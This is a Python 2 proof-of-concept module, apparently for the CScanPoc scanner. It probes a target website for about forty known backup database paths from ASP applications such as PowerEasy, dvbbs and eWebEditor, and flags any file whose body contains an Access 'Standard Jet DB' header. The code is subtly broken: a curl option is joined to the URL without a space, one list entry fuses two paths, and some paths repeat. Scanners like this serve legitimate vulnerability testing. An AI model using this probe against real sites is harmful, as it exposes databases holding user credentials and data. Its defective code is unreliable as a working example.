# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'Info_mdb' # 平台漏洞编号，留空
    name = '网站备份数据文件泄露' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = '2008-08-08'  # 漏洞公布时间
    desc = '''
        网站mdb备份数据文件泄露,mdb是常见的asp网站的数据库文件。
    ''' # 漏洞描述
    ref = '' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'Info_mdb'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd43f15ae-458e-4ef2-be82-4f16a77a4c5a'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payloads = [
            'database/PowerEasy4.mdb',
            'database/PowerEasy5.mdb',
            'database/PowerEasy6.mdb',
            'database/PowerEasy2005.mdb',
            'database/PowerEasy2006.mdb',
            'database/PE_Region.mdb',
            'data/dvbbs7.mdb',
            'databackup/dvbbs7.mdb',
            'bbs/databackup/dvbbs7.mdb',
            'data/zm_marry.asp',
            'databackup/dvbbs7.mdb',
            'admin/data/qcdn_news.mdb',
            'firend.mdb',
            'database/newcloud6.mdb',
            'database/%23newasp.mdb',
            'blogdata/L-BLOG.mdb',
            'blog/blogdata/L-BLOG.mdb',
            'database/bbsxp.mdb',
            'bbs/database/bbsxp.mdb',
            'access/sf2.mdb',
            'data/Leadbbs.mdb',
            'bbs/Data/LeadBBS.mdb',
            'bbs/access/sf2.mdb',
            'fdnews.asp',
            'bbs/fdnews.asp',
            'admin/ydxzdate.asa',
            'data/down.mdb',
            'data/db1.mdb',
            'database/Database.mdb',
            'db/xzjddown.mdb',
            'admin/data/user.asp',
            'data_jk/joekoe_data.asp',
            'data/news3000.asp',
            'data/appoen.mdb',
            'data/12912.asp',
            'database.asp',
            'download.mdb',
            'dxxobbs/mdb/dxxobbs.mdb',
            'db/6k.asp',
            'database/snowboy.mdb',
            'database/%23mmdata.mdb',
            'editor/db/ewebeditor.mdbeWebEditor/db/ewebeditor.mdb',
            ] 
            for payload in payloads:
                url = arg + payload
                code, head, body, error, _ = hh.http('--max-filesize 1024000'+url)                       
                if code == 200 and 'Standard Jet DB' in body:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))


        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()